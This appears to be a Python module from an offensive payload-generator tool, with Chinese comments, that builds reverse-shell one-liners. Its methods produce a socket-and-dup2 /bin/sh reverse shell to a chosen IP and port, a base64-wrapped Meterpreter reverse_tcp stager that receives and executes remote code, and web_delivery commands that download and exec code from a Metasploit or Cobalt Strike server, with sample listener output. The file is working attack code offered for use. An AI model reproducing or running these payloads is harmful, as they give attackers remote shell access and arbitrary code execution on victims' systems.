# encoding: utf8
from .config import *
import base64


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Python Reverse Shell',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_simple_reverse = """
适用于linux，反弹一个sh，ncat监听

#  ncat -lvp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:58026.
sh: no job control in this shell
sh-3.2$ whoami
"""

        self.desc_meter_tcp_reverse = """
测试win10 、linux，使用python2和python3都可以

msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

"""

        self.meter_tcp_code = """
import socket,struct,time
for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('{ip}',{port}))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(d,{{'s':s}})"""

        self.desc_web_delivery = """
web_delivery方式传递payload
msf-payload同时支持py2和py3
支持cobalt和metasploit

msf5 exploit(multi/script/web_delivery) > 
[*] Using URL: http://0.0.0.0:8080/7GZqqSbolhK8
[*] Local IP: http://192.168.1.100:4444/7GZqqSbolhK8
[*] Server started.
[*] Run the following command on the target machine:

python -c "import sys;u=__import__('urllib'+{{2:'',3:'.request'}}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://127.0.0.1:4444/7GZqqSbolhK8');exec(r.read());"

cobalt默认地址{url}

msf比较稳定
""".format(url=cobalt_python)

    def online_reverse(self):
        pass

    def simple_reverse(self, ip, port):
        call_sh = '/bin/sh'
        return "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['{sh}','-i']);\"".format(
            ip=ip, port=port, sh=call_sh)

    # base64模块的py2和py3有点不一样
    def bcode(self, ip, port):
        return str(base64.b64encode(self.meter_tcp_code.format(ip=ip, port=port).encode('utf-8')), 'utf-8')

    def meter_reverse(self):
        return "python -c \"import base64,sys;exec(base64.b64decode({{2:str,3:lambda b:bytes(b,'UTF-8')}}[sys.version_info[0]]('{bcode}')))\""

    def web_delivery(self):
        return "python -c \"import urllib2; exec urllib2.urlopen('{url}').read();\"".format(url=cobalt_python)

    def tty_shell(self):
        return "python -c \"import pty;pty.spawn('/bin/bash')\""
